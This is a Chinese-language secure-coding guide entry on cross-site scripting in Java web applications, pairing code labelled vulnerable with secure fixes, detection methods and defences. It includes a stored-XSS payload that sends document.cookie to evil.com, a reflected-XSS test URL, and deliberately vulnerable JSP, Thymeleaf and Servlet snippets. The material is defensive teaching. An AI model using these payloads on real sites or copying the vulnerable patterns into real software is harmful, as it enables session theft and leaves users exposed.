---
id: XSS
name: 跨站脚本攻击
severity: high
owasp: "A05:2025"
cwe: ["CWE-79"]
category: injection
frameworks: [JSP, Thymeleaf, FreeMarker, Velocity]
last_updated: "2026-04-18"
doc_version: "1.0"
---

# 跨站脚本攻击（XSS）

> 最后更新：2026-04-18

## 概述

跨站脚本攻击（Cross-Site Scripting，XSS）是一种代码注入攻击，攻击者将恶意脚本注入到受信任的网站中，当其他用户浏览该页面时，嵌入的恶意脚本会在用户浏览器中执行，从而窃取用户会话、篡改页面内容或重定向用户。

在 Java Web 应用中，JSP、Thymeleaf、FreeMarker 等模板引擎如果不正确处理用户输入，都可能导致 XSS 漏洞。

## 风险等级

| 维度 | 评级 |
|------|------|
| OWASP Top 10 | A05:2025 - Injection |
| CWE | CWE-79 |
| 严重程度 | 高危 |

## 攻击类型

### 1. 反射型 XSS（Reflected XSS）

恶意脚本通过 URL 参数传入，服务端将参数值直接拼接到 HTML 响应中返回。脚本仅在当次请求中执行，不会持久化存储。

```
https://example.com/search?q=<script>alert(document.cookie)</script>
```

### 2. 存储型 XSS（Stored XSS）

恶意脚本被存储到服务端（如数据库、文件），当其他用户访问包含该数据的页面时触发。危害最大，影响范围广。

```html
<!-- 用户提交评论内容存储到数据库 -->
<textarea>评论内容：<script>fetch('https://evil.com/steal?c='+document.cookie)</script></textarea>
```

### 3. DOM 型 XSS（DOM-based XSS）

恶意脚本通过 DOM 操作在客户端执行，不经过服务端。常见于 JavaScript 动态渲染用户输入的场景。

```javascript
// 从 URL hash 取值并直接写入 DOM
document.getElementById('content').innerHTML = location.hash.slice(1);
```

### 4. 模板注入型 XSS

在 Thymeleaf、FreeMarker 等模板引擎中，使用非转义输出指令直接输出用户输入。

```html
<!-- Thymeleaf 使用 th:utext 不转义输出 -->
<div th:utext="${userInput}"></div>
```

## Java场景

### [VULNERABLE] JSP 直接输出用户输入

```jsp
<%-- [VULNERABLE] 直接输出用户输入，存在 XSS 漏洞 --%>
<%
    String name = request.getParameter("name");
    // 漏洞：未对用户输入进行 HTML 编码，直接输出到页面
%>
<h1>Welcome, <%= name %></h1>
<div><%= request.getParameter("comment") %></div>
```

### [VULNERABLE] Thymeleaf 非转义输出

```java
// [VULNERABLE] 使用 th:utext 不转义输出用户输入
@Controller
public class XssVulnerableController {

    @GetMapping("/profile")
    public String profile(@RequestParam String bio, Model model) {
        // 漏洞：使用 utext 不转义，攻击者可注入 HTML/JS
        model.addAttribute("bio", bio);
        return "profile"; // 模板中使用 th:utext="${bio}"
    }
}
```

```html
<!-- profile.html - 漏洞模板 -->
<div th:utext="${bio}"></div>
```

### [VULNERABLE] Servlet 响应直接拼接

```java
// [VULNERABLE] Servlet 中直接拼接用户输入到 HTML 响应
@WebServlet("/search")
public class SearchServlet extends HttpServlet {
    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp)
            throws ServletException, IOException {
        String query = req.getParameter("q");
        resp.setContentType("text/html;charset=UTF-8");
        PrintWriter out = resp.getWriter();
        // 漏洞：直接拼接用户输入到 HTML
        out.println("<h1>搜索结果：" + query + "</h1>");
        out.println("<p>您搜索的关键词是：" + query + "</p>");
    }
}
```

### [SECURE] 使用 HTML 编码输出

```java
// [SECURE] 使用 OWASP Java Encoder 进行 HTML 编码
import org.owasp.encoder.Encode;

@WebServlet("/search")
public class SearchSecureServlet extends HttpServlet {
    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp)
            throws ServletException, IOException {
        String query = req.getParameter("q");
        resp.setContentType("text/html;charset=UTF-8");
        PrintWriter out = resp.getWriter();
        // 安全：对用户输入进行 HTML 编码后再输出
        out.println("<h1>搜索结果：" + Encode.forHtml(query) + "</h1>");
        out.println("<p>您搜索的关键词是：" + Encode.forHtml(query) + "</p>");
    }
}
```

### [SECURE] Thymeleaf 默认转义 + CSP

```java
// [SECURE] Thymeleaf 使用默认 th:text（自动转义），并配置 CSP
@Controller
public class XssSecureController {

    @GetMapping("/profile")
    public String profile(@RequestParam String bio, Model model) {
        // 安全：使用 th:text 默认转义 HTML 特殊字符
        model.addAttribute("bio", bio);
        return "profile"; // 模板中使用 th:text="${bio}"
    }
}
```

```html
<!-- profile.html - 安全模板 -->
<div th:text="${bio}"></div>
```

```java
// [SECURE] 配置 Content-Security-Policy 响应头
@Configuration
public class SecurityConfig implements WebMvcConfigurer {
    @Override
    public void addInterceptors(InterceptorRegistry registry) {
        registry.addInterceptor(new HandlerInterceptor() {
            @Override
            public boolean preHandle(HttpServletRequest request,
                    HttpServletResponse response, Object handler) {
                response.setHeader("Content-Security-Policy",
                    "default-src 'self'; script-src 'self'; style-src 'self'");
                return true;
            }
        });
    }
}
```

## 检测方法

1. **静态分析**：使用 SonarQube、Semgrep、Fortify 等工具扫描 JSP/Thymeleaf 模板中的未转义输出（如 `<%=`、`th:utext`、`v-html`）
2. **动态测试**：使用 OWASP ZAP、Burp Suite 进行自动化 XSS 扫描，在输入字段注入测试 payload
3. **手动审计**：逐页检查模板文件，确认所有用户输入点是否经过适当的编码/转义
4. **浏览器开发者工具**：检查 HTTP 响应头是否包含 `X-XSS-Protection`、`Content-Security-Policy` 等安全头

## 防护措施

1. **输出编码**：对所有用户输入在输出到 HTML 时进行 HTML 实体编码，使用 OWASP Java Encoder 等成熟库
2. **模板引擎安全使用**：Thymeleaf 使用 `th:text` 而非 `th:utext`；JSP 使用 JSTL `<c:out>` 标签或 EL 表达式 `${fn:escapeXml()}`
3. **Content-Security-Policy**：配置严格的 CSP 策略，禁止内联脚本执行
4. **输入校验**：对用户输入进行白名单校验，拒绝包含 HTML/JS 标签的输入
5. **HttpOnly Cookie**：设置会话 Cookie 的 HttpOnly 属性，防止 JavaScript 读取

## 参考资料

- [OWASP XSS 攻击说明](https://owasp.org/www-community/attacks/xss/)
- [CWE-79: Improper Neutralization of Input During Web Page Generation](https://cwe.mitre.org/data/definitions/79.html)
- [OWASP Java Encoder Project](https://owasp.org/www-project-java-encoder/)
- [MDN: Content-Security-Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
